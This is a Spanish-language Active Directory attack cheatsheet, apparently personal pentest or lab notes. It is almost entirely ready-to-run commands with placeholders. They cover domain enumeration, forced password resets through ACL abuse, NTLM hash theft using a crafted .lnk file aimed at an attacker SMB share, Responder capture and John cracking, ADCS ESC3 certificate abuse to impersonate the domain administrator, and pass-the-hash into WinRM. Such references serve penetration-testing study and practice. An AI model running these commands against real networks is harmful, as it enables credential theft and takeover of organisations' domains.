---
tags: [cheatsheet, ad, active-directory]
tipo: cheatsheet
ultima_revision: 2026-10-20
---

# Cheatsheet — Active Directory

```bash
# Enumeración
netexec smb <DC> -u '' -p ''                      # null auth
netexec smb <DC> -u <u> -p '<pw>' --users --shares --rid-brute
bloodhound-python -u <u> -p '<pw>' -d <dom> -dc <dc> -ns <DC> -c All --zip

# Abuso de ACLs (ForceChangePassword)
net rpc password <target> '<NuevaPw!>' -U '<dom>/<u>%<pw>' -S <DC>

# NTLM theft
python3 -c "import pylnk3; l=pylnk3.create('config.lnk'); l.icon=r'\\\\<IP>\\share\\x.ico'; l.work_dir=r'\\\\<IP>\\share'; l.save()"
sudo responder -I vboxnet0 -wv
smbclient "//<DC>/Share" -U 'dom/user%pw' -c 'put config.lnk config.lnk'
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Tombstones (LDAP show-deleted)
# control 1.2.840.113556.1.4.417 + filtro (isDeleted=TRUE)

# ADCS
certipy-ad find -u <u>@dom -p '<pw>' -dc-ip <DC> -vulnerable -stdout
certipy-ad req -u <u>@dom -p '<pw>' -ca <CA> -template <T>
certipy-ad req -u <u>@dom -p '<pw>' -ca <CA> -template User -on-behalf-of 'DOM\Administrador' -pfx agente.pfx -out admin
certipy-ad auth -pfx admin.pfx -dc-ip <DC>

# Pass-the-Hash
netexec winrm <DC> -u Administrador -H <hash_NT>
evil-winrm -i <DC> -u Administrador -H <hash_NT>
```

## Validación obligatoria

- ACEs salientes, tokenGroups, DRSUAPI (DCSync), shares.

## Técnicas

- [[AD-Abuso-de-ACLs]], [[Responder-NTLM-Theft]], [[AD-Tombstones]], [[ADCS-ESC3]], [[PKINIT-Pass-The-Hash]], [[BloodHound]]
